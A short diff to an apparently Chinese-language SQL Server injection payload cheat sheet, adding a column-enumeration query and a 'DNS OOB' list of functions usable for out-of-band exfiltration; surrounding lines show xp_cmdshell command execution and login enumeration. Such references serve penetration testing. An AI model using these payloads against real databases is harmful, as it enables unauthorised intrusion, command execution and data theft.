@@ -22,6 +22,7 @@ SQL Server Payload
     - ``SELECT name FROM master..syslogins``
 - 数据库信息
     - ``SELECT name FROM master..sysdatabases``
+    - ``select concat_ws(table_schema,table_name,column_name) from information_schema.columns``
     - ``select quotename(name) from master..sysdatabases FOR XML PATH('')``
 - 执行命令
     - ``EXEC xp_cmdshell 'net user'``
@@ -56,3 +57,9 @@ SQL Server Payload
 - FILE_NAME()
 - TYPE_NAME()
 - COL_NAME()
+
+DNS OOB
+----------------------------------------
+- fn_xe_file_target_read_file
+- fn_get_audit_file
+- fn_trace_gettable
